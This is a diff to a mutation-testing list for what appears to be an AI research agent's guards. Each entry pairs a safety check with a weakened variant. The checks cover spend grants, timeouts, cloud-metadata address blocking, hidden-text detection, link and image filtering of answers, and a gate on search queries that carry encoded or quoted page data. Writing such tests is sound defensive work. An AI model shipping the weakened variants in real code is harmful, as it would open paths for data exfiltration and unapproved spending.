-  M("raw-addresses-stay", "PR-39", FILTER, "out = out.replace(RAW, (match) => {", "out = out.replace(/(?!)/g, (match) => {"),
-  M("images-stay", "PR-39", FILTER, "out = out.replace(IMAGE, drop);", ""),
+  M("raw-addresses-stay", "PR-39", FILTER, "out = out.replace(SCHEME_ADDRESS, (match) => address(match, cited));", ""),
+  M("images-stay", "PR-39", FILTER, "out = out.replace(IMAGE, drop).replace(IMAGE_REF, drop);", ""),
   M("links-stay", "PR-39", FILTER, "(cited.has(target.trim()) ? whole : `${words} ${drop()}`)", "whole"),
   M("autolinks-stay", "PR-39", FILTER, "(cited.has(whole.slice(1, -1)) ? whole : drop())", "whole"),
-  M("an-altered-cited-address-stays", "PR-39", FILTER, "return cited.has(address) ? match : `${drop()}${tail}`;", "return match;"),
+  M("an-altered-cited-address-stays", "PR-39", FILTER, "return kept.has(trimmed) ? match : `${drop()}${tail}`;", "return match;"),
   M("an-answer-leaves-unfiltered", "PR-39", LOOP, "answer: { text: filtered.text,", "answer: { text: admitted.answer.text,"),
   M("a-body-over-the-cap-once-decoded-is-read", "PR-32", GUARD, "if (utf8Length(row.body) > maxBytes) return 'the body is longer than the cap once decoded';", ""),
   M("a-metadata-address-is-a-private-one", "PR-12", ADDR, "'100.100.100.200', '168.63.129.16'];", "'100.100.100.200'];"),
   M("a-key-parameter-is-a-page-facet", "PR-14", URLP, "'jwt', 'key', 'password',", "'jwt', 'password',"),
   M("the-cache-is-the-old-size", "PR-22", CACHE, "{ ttlMs: 15 * 60_000, maxPagesPerScope: 8, maxScopes: 64 };", "{ ttlMs: 15 * 60_000, maxPagesPerScope: 32, maxScopes: 256 };"),
+  M("a-grant-that-is-slow-is-a-refusal-of-another-kind", "PR-37", BUDGET, "if (answer === 'timeout') return researchRefused('TIMEOUT', 'the spend grant did not answer in time');", ""),
+  M("a-value-less-answer-is-a-value", "PR-37", TIMING, "return row.done === true && 'value' in row ?", "return row.done === true ?"),
+  M("the-total-fetch-budget-goes", "PR-37", GUARD, "if (left < 1) return researchRefused('TIMEOUT', 'the fetch used up its total time', { hop });", ""),
+  M("a-hop-ignores-the-total", "PR-37", GUARD, "const hopMs = Math.min(timeoutOf(deps.timeouts, 'fetchMs'), timeoutMs + FETCH_GRACE_MS, left);", "const hopMs = Math.min(timeoutOf(deps.timeouts, 'fetchMs'), timeoutMs + FETCH_GRACE_MS);"),
+  M("a-lookup-ignores-the-total", "PR-37", GUARD, "dnsMs: Math.min(timeoutOf(deps.timeouts, 'dnsMs'), left)", "dnsMs: timeoutOf(deps.timeouts, 'dnsMs')"),
+  M("the-loop-gives-the-fetch-the-whole-deadline", "PR-37", LOOP, "fetchTotalMs: Math.max(1, Math.min(timeoutOf(deps.timeouts, 'fetchTotalMs'), left - DEADLINE_MARGIN_MS)),", "fetchTotalMs: timeoutOf(deps.timeouts, 'fetchTotalMs'),"),
+  M("a-long-allow-list-path-is-fetched", "PR-33", PROVENANCE, "|| pathOf(canonical).length > MAX_ALLOW_LIST_PATH_CHARS) return 'not-listed';", ") return 'not-listed';"),
+  M("entities-are-not-decoded-first", "PR-39", FILTER, "const next = pass(decode(current), cited, bare);", "const next = pass(current, cited, bare);"),
+  M("one-pass-is-enough", "PR-39", FILTER, "if (next.text === current) return { text: current, removed, stable: true };", "return { text: next.text, removed, stable: true };"),
+  M("an-unstable-answer-is-returned", "PR-39", FILTER, "return { text: LINK_REMOVED, removed, stable: false };", "return { text: current, removed, stable: true };"),
+  M("reference-definitions-stay", "PR-39", FILTER, "out = out.replace(REFERENCE_DEFINITION, (whole, target: string) => (cited.has(target) ? whole : drop()));", ""),
+  M("reference-links-stay", "PR-39", FILTER, "out = out.replace(LINK_REF, (_whole, words: string) => `${words} ${drop()}`);", ""),
+  M("scheme-relative-addresses-stay", "PR-39", FILTER, "out = out.replace(SCHEME_RELATIVE, drop);", ""),
+  M("bare-addresses-stay", "PR-39", FILTER, "out = out.replace(BARE_ADDRESS, (match) => address(match, bare));", ""),
+  M("script-schemes-stay", "PR-39", FILTER, "out = out.replace(SCRIPT_SCHEME, drop);", ""),
+  M("every-angle-bracket-name-is-a-tag", "PR-39", FILTER, "${TAG_NAMES.join('|')}", "[A-Za-z][A-Za-z0-9]*"),
+  M("a-type-argument-is-a-tag", "PR-39", FILTER, "(TYPE_LIKE.has(name.toLowerCase()) && /^<[A-Z][a-z]*>$/.test(whole) ? whole : gone())", "gone()"),
+  M("a-long-search-query-is-sent", "PR-40", PROVENANCE, "if (query.length > MAX_PLANNER_QUERY_CHARS) return 'query-too-long';", ""),
+  M("an-address-in-a-query-is-sent", "PR-40", PROVENANCE, "if (ADDRESS_IN_QUERY.test(query)) return 'query-has-address';", ""),
+  M("encoded-data-in-a-query-is-sent", "PR-40", PROVENANCE, "if (ENCODED_RUN.test(query)) return 'query-has-encoded-data';", ""),
+  M("a-page-quote-in-a-query-is-sent", "PR-40", PROVENANCE, "if (pages.some((page) => page.includes(slice))) return 'query-quotes-a-page';", ""),
+  M("the-query-gate-is-skipped", "PR-40", LOOP, "const queryProblem = kind === 'search' && row !== null ? queryProvenanceProblem(row.query, [...pages.values()].map((page) => page.text)) : null;", "const queryProblem = null;"),
+  M("the-planner-is-told-the-exact-query-reason", "PR-40", LOOP, "note('search refused: QUERY_REFUSED/not-sendable');", "note('search refused: QUERY_REFUSED/' + queryProblem);"),
+  M("a-planner-answer-shape-is-not-checked", "PR-37", LOOP, "|| !('action' in planned.value)) {", ") {"),
+  M("a-search-answer-shape-is-not-checked", "PR-37", SEARCHRT, "typeof timed.value === 'object' && timed.value !== null && 'answer' in timed.value", "true"),
 ];
 
 const BEHAVIOUR_MUTATIONS = [
   B("a-paid-search-with-no-budget-is-called", "PR-9", BUDGET, "const capMicroUsd = isMicro(asked, 1) ? ceiling(asked) : null;", "const capMicroUsd = isMicro(asked, 1) ? ceiling(asked) : 1000000;", ["PR-38"]),
   B("a-zero-budget-is-a-budget", "PR-9", BUDGET, "const isMicro = (value: unknown, min: number): value is number => typeof value === 'number' && Number.isSafeInteger(value) && value >= min;", "const isMicro = (value: unknown, min: number): value is number => typeof value === 'number' && Number.isSafeInteger(value) && value >= 0;"),
-  B("a-truthy-grant-is-a-grant", "PR-10", BUDGET, "return (await grant(request)) === true;", "return Boolean(await grant(request));"),
-  B("a-thrown-grant-is-a-grant", "PR-10", BUDGET, "  } catch {\n    return false;", "  } catch {\n    return true;"),
-  B("a-paid-search-goes-out-with-no-grant", "PR-10", BUDGET, "  if (!(await granted(grant, request))) return researchRefused('NO_GRANT', 'no spend grant confirms this paid search');\n", "", ["PR-38"]),
+  B("a-truthy-grant-is-a-grant", "PR-10", BUDGET, "return { yes: (await grant(request)) === true };", "return { yes: Boolean(await grant(request)) };"),
+  B("a-thrown-grant-is-a-grant", "PR-10", BUDGET, "    } catch {\n      return { yes: false };", "    } catch {\n      return { yes: true };"),
+  B("a-paid-search-goes-out-with-no-grant", "PR-10", BUDGET, "  const answer = await granted(grant, request, timer, timeouts);\n  if (answer === 'timeout') return researchRefused('TIMEOUT', 'the spend grant did not answer in time');\n  if (answer !== 'yes') return researchRefused('NO_GRANT', 'no spend grant confirms this paid search');\n", "", ["PR-38","PR-37"]),
   B("a-search-over-budget-goes-out", "PR-10", BUDGET, "reserved + microUsd > capMicroUsd) return false;", "false) return false;", ["PR-38"]),
   B("the-reservation-is-never-kept", "PR-10", BUDGET, "      reserved += microUsd;\n", "", ["PR-11","PR-38"]),
   B("a-charged-query-is-refunded", "PR-11", SEARCHRT, "if (price.paid && (kind === 'not_sent' || kind === 'not_configured')) deps.spend.release(price.microUsd);", "if (price.paid) deps.spend.release(price.microUsd);"),
@@ -2175,7 +2355,7 @@ const BEHAVIOUR_MUTATIONS = [
   B("a-long-question-is-asked", "PR-32", LOOP, "|| question.length > MAX_QUESTION_CHARS ||", "||"),
   B("the-run-addresses-are-not-asked", "PR-33", LOOP, "const problem = urlProvenanceProblem(row.url, listed, deps.policy, hosts);", "const problem = null;"),
   B("a-subdomain-of-an-allowed-host-is-allowed", "PR-33", PROVENANCE, "rule.pattern === host)", "host.endsWith(rule.pattern))"),
-  B("a-query-is-allowed-in-allow-mode", "PR-33", PROVENANCE, "if (!named || url.includes('?') || url.includes('#')) return 'not-listed';", "if (!named) return 'not-listed';"),
+  B("a-query-is-allowed-in-allow-mode", "PR-33", PROVENANCE, "url.includes('?') || url.includes('#') || ", ""),
   B("the-host-cap-goes", "PR-33", PROVENANCE, "hosts.has(host) || hosts.size < MAX_HOSTS_PER_RUN ? null : 'too-many-hosts'", "null"),
   B("the-length-cap-goes", "PR-33", PROVENANCE, "if (url.length > MAX_FETCH_URL_CHARS) return 'url-too-long';", ""),
   B("a-search-result-is-not-listed", "PR-33", LOOP, "if (canonical !== null && listed.size < 400) listed.add(canonical);", ""),
@@ -2187,7 +2367,7 @@ const BEHAVIOUR_MUTATIONS = [
   B("the-callers-encoding-is-used", "PR-34", GUARD, "return { ...Object.fromEntries(kept), 'accept-encoding': 'identity' };", "return { ...Object.fromEntries(kept) };"),
   B("a-downgrade-is-followed", "PR-34", GUARD, "if (hop > 0 && previous?.scheme === 'https' && verdict.url.scheme === 'http') return researchRefused('URL_REFUSED', 'a redirect may not leave https for http', { reason: 'redirect-downgrade', hop });", ""),
   B("a-mapped-address-is-another-address", "PR-34", ADDR, "if ((zeros(g, 0, 5) && g[5] === 0xffff) || (zeros(g, 0, 4) && g[4] === 0xffff && g[5] === 0)) return v4Of(g[6] as number, g[7] as number).join('.');", ""),
-  B("the-lookup-is-not-remembered", "PR-35", READABLE, "if (known !== undefined && from >= known.from && known.at >= from) return known.at;", "", ["PR-19","PR-25","PR-39"]),
+  B("the-lookup-is-not-remembered", "PR-35", READABLE, "if (known !== undefined && from >= known.from && known.at >= from) return known.at;", "", ["PR-19","PR-25","PR-39","PR-40"]),
   B("font-size-zero-is-shown", "PR-35", READABLE, "'font-size\\\\s*:\\\\s*0(?![.\\\\d])(?:px|em|rem|pt|%)?', ", ""),
   B("opacity-zero-is-shown", "PR-35", READABLE, "'opacity\\\\s*:\\\\s*0(?:\\\\.0*)?(?![.\\\\d])', ", ""),
   B("tag-characters-are-allowed", "PR-36", SCREEN, "${range(0xe0000, 0xe007f)}", ""),
@@ -2207,23 +2387,46 @@ const BEHAVIOUR_MUTATIONS = [
   B("the-planner-is-not-timed-out", "PR-37", LOOP, "if (planned.kind === 'timeout') {", "if (false) {"),
   B("a-timeout-is-never-a-deadline", "PR-37", LOOP, "return after === null || after - startedAt >= limits.deadlineMs", "return after === null"),
   B("the-budget-ceiling-goes", "PR-38", BUDGET, "Math.min(value, MAX_RUN_BUDGET_MICRO_USD)", "value"),
-  B("the-planner-is-free", "PR-38", LOOP, "const cost = plannerCostOf(deps.plannerPrice, chars);", "const cost = 0;"),
+  B("the-planner-is-free", "PR-38", LOOP, "const cost = plannerCostOf(deps.plannerPrice, chars);", "const cost = 0;", ["PR-37"]),
   B("the-planner-price-ignores-the-evidence", "PR-38", LOOP, "price.baseMicroUsd + Math.ceil(chars / 1000) * price.perKiloCharMicroUsd", "price.baseMicroUsd"),
   B("a-bad-planner-price-is-taken", "PR-38", LOOP, "|| !priceUsable(deps.plannerPrice)) {", ") {"),
-  B("the-planner-grant-is-never-asked", "PR-38", LOOP, "const gate = await reservePaidQuery(spend, deps.grant, { scope, provider: 'planner', microUsd: cost });", "const gate = null;"),
+  B("the-planner-grant-is-never-asked", "PR-38", LOOP, "const gate = await reservePaidQuery(spend, deps.grant, { scope, provider: 'planner', microUsd: cost }, deps.timer, { grantMs: Math.min(timeoutOf(deps.timeouts, 'grantMs'), left) });", "const gate = null;", ["PR-37"]),
   B("brave-needs-no-ledger", "PR-38", BRAVE, "if (typeof config.ledger !== 'function') return researchRefused('INVALID_REQUEST', 'Brave is paid and is not enabled without a cross-run ledger that answers exactly true');", ""),
   B("a-truthy-ledger-is-a-yes", "PR-38", BRAVE, "approved = (await config.ledger({ scope, provider: 'brave', microUsd: price })) === true;", "approved = Boolean(await config.ledger({ scope, provider: 'brave', microUsd: price }));"),
   B("a-ledger-that-says-no-is-ignored", "PR-38", BRAVE, "if (!approved) throw new SearchProviderError('not_sent', 'the cross-run ledger did not confirm this query');", ""),
-  B("raw-addresses-stay", "PR-39", FILTER, "out = out.replace(RAW, (match) => {", "out = out.replace(/(?!)/g, (match) => {"),
-  B("images-stay", "PR-39", FILTER, "out = out.replace(IMAGE, drop);", ""),
+  B("raw-addresses-stay", "PR-39", FILTER, "out = out.replace(SCHEME_ADDRESS, (match) => address(match, cited));", ""),
+  B("images-stay", "PR-39", FILTER, "out = out.replace(IMAGE, drop).replace(IMAGE_REF, drop);", ""),
   B("links-stay", "PR-39", FILTER, "(cited.has(target.trim()) ? whole : `${words} ${drop()}`)", "whole"),
   B("autolinks-stay", "PR-39", FILTER, "(cited.has(whole.slice(1, -1)) ? whole : drop())", "whole"),
-  B("an-altered-cited-address-stays", "PR-39", FILTER, "return cited.has(address) ? match : `${drop()}${tail}`;", "return match;"),
+  B("an-altered-cited-address-stays", "PR-39", FILTER, "return kept.has(trimmed) ? match : `${drop()}${tail}`;", "return match;"),
   B("an-answer-leaves-unfiltered", "PR-39", LOOP, "answer: { text: filtered.text,", "answer: { text: admitted.answer.text,"),
   B("a-body-over-the-cap-once-decoded-is-read", "PR-32", GUARD, "if (utf8Length(row.body) > maxBytes) return 'the body is longer than the cap once decoded';", ""),
   B("a-metadata-address-is-a-private-one", "PR-12", ADDR, "'100.100.100.200', '168.63.129.16'];", "'100.100.100.200'];"),
   B("a-key-parameter-is-a-page-facet", "PR-14", URLP, "'jwt', 'key', 'password',", "'jwt', 'password',"),
   B("the-cache-is-the-old-size", "PR-22", CACHE, "{ ttlMs: 15 * 60_000, maxPagesPerScope: 8, maxScopes: 64 };", "{ ttlMs: 15 * 60_000, maxPagesPerScope: 32, maxScopes: 256 };"),
+  B("a-grant-that-is-slow-is-a-refusal-of-another-kind", "PR-37", BUDGET, "if (answer === 'timeout') return researchRefused('TIMEOUT', 'the spend grant did not answer in time');", ""),
+  B("a-value-less-answer-is-a-value", "PR-37", TIMING, "return row.done === true && 'value' in row ?", "return row.done === true ?"),
+  B("the-total-fetch-budget-goes", "PR-37", GUARD, "if (left < 1) return researchRefused('TIMEOUT', 'the fetch used up its total time', { hop });", ""),
+  B("a-hop-ignores-the-total", "PR-37", GUARD, "const hopMs = Math.min(timeoutOf(deps.timeouts, 'fetchMs'), timeoutMs + FETCH_GRACE_MS, left);", "const hopMs = Math.min(timeoutOf(deps.timeouts, 'fetchMs'), timeoutMs + FETCH_GRACE_MS);"),
+  B("a-lookup-ignores-the-total", "PR-37", GUARD, "dnsMs: Math.min(timeoutOf(deps.timeouts, 'dnsMs'), left)", "dnsMs: timeoutOf(deps.timeouts, 'dnsMs')"),
+  B("the-loop-gives-the-fetch-the-whole-deadline", "PR-37", LOOP, "fetchTotalMs: Math.max(1, Math.min(timeoutOf(deps.timeouts, 'fetchTotalMs'), left - DEADLINE_MARGIN_MS)),", "fetchTotalMs: timeoutOf(deps.timeouts, 'fetchTotalMs'),"),
+  B("a-long-allow-list-path-is-fetched", "PR-33", PROVENANCE, "|| pathOf(canonical).length > MAX_ALLOW_LIST_PATH_CHARS) return 'not-listed';", ") return 'not-listed';"),
+  B("entities-are-not-decoded-first", "PR-39", FILTER, "const next = pass(decode(current), cited, bare);", "const next = pass(current, cited, bare);"),
+  B("one-pass-is-enough", "PR-39", FILTER, "if (next.text === current) return { text: current, removed, stable: true };", "return { text: next.text, removed, stable: true };"),
+  B("an-unstable-answer-is-returned", "PR-39", FILTER, "return { text: LINK_REMOVED, removed, stable: false };", "return { text: current, removed, stable: true };"),
+  B("reference-definitions-stay", "PR-39", FILTER, "out = out.replace(REFERENCE_DEFINITION, (whole, target: string) => (cited.has(target) ? whole : drop()));", ""),
+  B("reference-links-stay", "PR-39", FILTER, "out = out.replace(LINK_REF, (_whole, words: string) => `${words} ${drop()}`);", ""),
+  B("scheme-relative-addresses-stay", "PR-39", FILTER, "out = out.replace(SCHEME_RELATIVE, drop);", ""),
+  B("bare-addresses-stay", "PR-39", FILTER, "out = out.replace(BARE_ADDRESS, (match) => address(match, bare));", ""),
+  B("script-schemes-stay", "PR-39", FILTER, "out = out.replace(SCRIPT_SCHEME, drop);", ""),
+  B("every-angle-bracket-name-is-a-tag", "PR-39", FILTER, "${TAG_NAMES.join('|')}", "[A-Za-z][A-Za-z0-9]*"),
+  B("a-type-argument-is-a-tag", "PR-39", FILTER, "(TYPE_LIKE.has(name.toLowerCase()) && /^<[A-Z][a-z]*>$/.test(whole) ? whole : gone())", "gone()"),
+  B("a-long-search-query-is-sent", "PR-40", PROVENANCE, "if (query.length > MAX_PLANNER_QUERY_CHARS) return 'query-too-long';", ""),
+  B("an-address-in-a-query-is-sent", "PR-40", PROVENANCE, "if (ADDRESS_IN_QUERY.test(query)) return 'query-has-address';", ""),
+  B("encoded-data-in-a-query-is-sent", "PR-40", PROVENANCE, "if (ENCODED_RUN.test(query)) return 'query-has-encoded-data';", ""),
+  B("a-page-quote-in-a-query-is-sent", "PR-40", PROVENANCE, "if (pages.some((page) => page.includes(slice))) return 'query-quotes-a-page';", ""),
+  B("the-query-gate-is-skipped", "PR-40", LOOP, "const queryProblem = kind === 'search' && row !== null ? queryProvenanceProblem(row.query, [...pages.values()].map((page) => page.text)) : null;", "const queryProblem = null;"),
+  B("the-planner-is-told-the-exact-query-reason", "PR-40", LOOP, "note('search refused: QUERY_REFUSED/not-sendable');", "note('search refused: QUERY_REFUSED/' + queryProblem);"),
 ];
 
 /** The change a copy needs to run: each relative import at its `.ts` path, and the package at the local shim. */
